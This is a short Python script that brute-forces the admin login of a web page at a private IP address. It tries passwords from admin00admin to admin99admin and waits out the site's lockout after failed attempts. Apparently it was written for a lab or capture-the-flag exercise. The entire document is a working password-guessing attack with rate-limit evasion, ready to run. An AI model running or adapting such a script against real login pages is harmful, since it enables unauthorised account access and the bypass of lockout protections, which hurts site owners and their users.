import re
import requests
import time

for x in range(0,10):
	for y in range(0,10):	
		data={'username': 'admin' , 'password': '', 'submit': 'Submit'}
		password="admin"+str(x)+str(y)+"admin"
		data["password"]=password
		response=requests.post('http://10.10.166.16/index.php', data=data)
		found1=re.findall("To many failed login attempts",response.text)
		found2=re.findall("Please enter valid login details",response.text)
		if found2 == ["Please enter valid login details"]:	
			print(data["password"]+" : Password Incorrecto")
		if found1 == ["To many failed login attempts"]:
			print(data["password"]+" : Password Incorrecto")
			time.sleep(60)
		if found1 != ["To many failed login attempts"] and found2 != ["Please enter valid login details"]:
			print(data["password"]+" : Password Correcto")
			quit()
			

